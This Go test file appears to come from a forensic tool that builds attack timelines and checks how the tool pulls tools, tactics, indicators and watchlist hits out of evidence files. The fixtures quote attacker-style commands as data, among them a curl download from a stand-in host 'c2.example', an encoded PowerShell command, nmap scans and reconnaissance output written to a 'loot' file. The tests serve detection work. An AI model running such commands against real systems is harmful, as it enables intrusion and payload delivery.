package trace

import (
	"slices"
	"testing"

	"github.com/get-sybers/slopmop/internal/evidence"
	"github.com/get-sybers/slopmop/internal/evidencetest"
	"github.com/get-sybers/slopmop/internal/indicator"
	"github.com/get-sybers/slopmop/internal/intel"
	"github.com/get-sybers/slopmop/internal/inventory"
	"github.com/get-sybers/slopmop/internal/structured"
	"github.com/get-sybers/slopmop/internal/tactic"
)

func loadTables(t *testing.T) Tables {
	t.Helper()
	tac, err := tactic.LoadTactics()
	if err != nil {
		t.Fatal(err)
	}
	ind, err := indicator.LoadPatterns()
	if err != nil {
		t.Fatal(err)
	}
	formats, err := structured.LoadFormats()
	if err != nil {
		t.Fatal(err)
	}
	return Tables{Tactics: tac, Patterns: ind, Formats: formats}
}

func TestBuildBash(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	if len(tl.Steps) == 0 {
		t.Fatal("no steps")
	}
	scripts := 0
	for _, s := range tl.Steps {
		if s.File.Role == evidence.Script {
			scripts++
			if s.Turn < 1 {
				t.Errorf("%s: turn %d, want >= 1", s.File.Path, s.Turn)
			}
		}
	}
	if scripts == 0 {
		t.Error("no scripts in timeline")
	}
}

func TestBuildHasToolsAndTactics(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	foundTools := false
	foundTactics := false
	for _, s := range tl.Steps {
		if len(s.Tools) > 0 {
			foundTools = true
		}
		if len(s.Tactics) > 0 {
			foundTactics = true
		}
	}
	if !foundTools {
		t.Error("no tools extracted from any script")
	}
	if !foundTactics {
		t.Error("no tactics classified for any script")
	}
}

func TestBuildHasIndicators(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)
	tl := Build(res.Files, res.Texts, tables)
	total := 0
	for _, s := range tl.Steps {
		total += s.Indicators
	}
	if total == 0 {
		t.Error("no indicators found in any file")
	}
}

func TestBuildEmpty(t *testing.T) {
	tables := loadTables(t)
	tl := Build(nil, nil, tables)
	if len(tl.Steps) != 0 {
		t.Errorf("steps = %d, want 0", len(tl.Steps))
	}
}

func TestSortByTime(t *testing.T) {
	a := evidence.File{Path: "b.sh"}
	b := evidence.File{Path: "a.sh"}
	sorted := sortByTime([]evidence.File{a, b})
	if sorted[0].Path != "a.sh" || sorted[1].Path != "b.sh" {
		t.Errorf("sorted = %v %v, want a.sh b.sh", sorted[0].Path, sorted[1].Path)
	}
}

func TestLinkOutputsByBaseName(t *testing.T) {
	files := []evidence.File{
		{Path: "run.sh", Role: evidence.Script},
		{Path: "run.ps1", Role: evidence.Script},
		{Path: "out.txt", Role: evidence.Output},
		{Path: "loot/dump.log", Role: evidence.Output},
		{Path: "unrelated.txt", Role: evidence.Output},
	}
	texts := map[string]string{
		"run.sh":  "id > ./out.txt\nid >> ./out.txt\n",
		"run.ps1": "whoami | Out-File -FilePath C:\\work\\dump.log\n",
	}
	tables := loadTables(t)
	got := map[string][]string{}
	for _, s := range Build(files, texts, tables).Steps {
		got[s.File.Path] = s.Outputs
	}
	if o := got["run.sh"]; len(o) != 1 || o[0] != "out.txt" {
		t.Errorf("run.sh outputs = %v, want [out.txt]", o)
	}
	if o := got["run.ps1"]; len(o) != 1 || o[0] != "loot/dump.log" {
		t.Errorf("run.ps1 outputs = %v, want [loot/dump.log]", o)
	}
}

func TestBuildWithWatchlist(t *testing.T) {
	folder := evidencetest.Copy(t, "bash")
	res, err := inventory.ReadAll(folder)
	if err != nil {
		t.Fatal(err)
	}
	tables := loadTables(t)

	// Build a watchlist with an IP that appears in the bash fixtures.
	wlData := []byte(`[{"value": "10.20.1.5", "attribution": "TEST-ACTOR"}]`)
	wl, err := intel.LoadWatchlist(wlData)
	if err != nil {
		t.Fatal(err)
	}
	tables.Watchlist = &wl
	tl := Build(res.Files, res.Texts, tables)
	totalHits := 0
	for _, s := range tl.Steps {
		totalHits += len(s.IntelHits)
	}
	if totalHits == 0 {
		t.Error("expected at least one intel hit against 10.20.1.5")
	}
}

func TestBaseName(t *testing.T) {
	cases := map[string]string{
		"out.txt":             "out.txt",
		"./out.txt":           "out.txt",
		"/tmp/a/out.txt":      "out.txt",
		`C:\loot\out.txt`:     "out.txt",
		`.\sub/mixed\out.txt`: "out.txt",
	}
	for in, want := range cases {
		if got := baseName(in); got != want {
			t.Errorf("baseName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestBuildStructuredReports(t *testing.T) {
	cases := []struct {
		name       string
		file       string
		text       string
		tools      []string
		transforms []string
		indicators int
		hit        string
	}{
		{
			name:       "json",
			file:       "report.json",
			text:       `{"steps": [{"command": "nmap -sV 10.0.0.5", "url": "http:\/\/c2.example\/drop"}]}`,
			tools:      []string{"nmap"},
			indicators: 3,
			hit:        "http://c2.example/drop",
		},
		{
			name:       "json with an encoded powershell command",
			file:       "events.jsonl",
			text:       `{"ProcessCommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}` + "\n",
			tools:      []string{"powershell.exe"},
			transforms: []string{"EncodedCommand"},
			indicators: 1,
		},
		{
			name:       "xml",
			file:       "export.xml",
			text:       `<run><command>curl -s "http://c2.example/drop?a=1&amp;b=2"</command></run>`,
			tools:      []string{"curl"},
			indicators: 2,
			hit:        "http://c2.example/drop?a=1&b=2",
		},
		{
			name:       "html",
			file:       "summary.html",
			text:       `<p>Fetched <a href="http://c2.example/drop">the payload</a></p><code>whoami</code>`,
			tools:      []string{"whoami"},
			indicators: 2,
			hit:        "http://c2.example/drop",
		},
		{
			name:       "malformed json is read as plain text",
			file:       "broken.json",
			text:       `{"command": "nmap 10.0.0.5", `,
			indicators: 1,
		},
		{
			name:       "plain text records no command",
			file:       "notes.txt",
			text:       `{"command": "nmap 10.0.0.5"}`,
			indicators: 1,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			tables := loadTables(t)
			if c.hit != "" {
				wl, err := intel.LoadWatchlist([]byte(`[{"value": "` + c.hit + `", "attribution": "TEST-ACTOR"}]`))
				if err != nil {
					t.Fatal(err)
				}
				tables.Watchlist = &wl
			}
			files := []evidence.File{{Path: c.file, Role: evidence.Output}}
			steps := Build(files, map[string]string{c.file: c.text}, tables).Steps
			if len(steps) != 1 {
				t.Fatalf("%d steps, want 1", len(steps))
			}
			s := steps[0]
			if !slices.Equal(s.Tools, c.tools) {
				t.Errorf("tools = %q, want %q", s.Tools, c.tools)
			}
			if !slices.Equal(s.Transforms, c.transforms) {
				t.Errorf("transforms = %q, want %q", s.Transforms, c.transforms)
			}
			if s.Indicators != c.indicators {
				t.Errorf("indicators = %d, want %d", s.Indicators, c.indicators)
			}
			if s.Turn != 0 || len(s.Outputs) != 0 {
				t.Errorf("turn %d outputs %q, want 0 and none", s.Turn, s.Outputs)
			}
			if c.hit != "" && (len(s.IntelHits) != 1 || s.IntelHits[0].Value != c.hit) {
				t.Errorf("intel hits = %+v, want one on %q", s.IntelHits, c.hit)
			}
			if c.tools != nil && len(s.Tactics) == 0 {
				t.Errorf("no tactic for %q", s.Tools)
			}
		})
	}
}
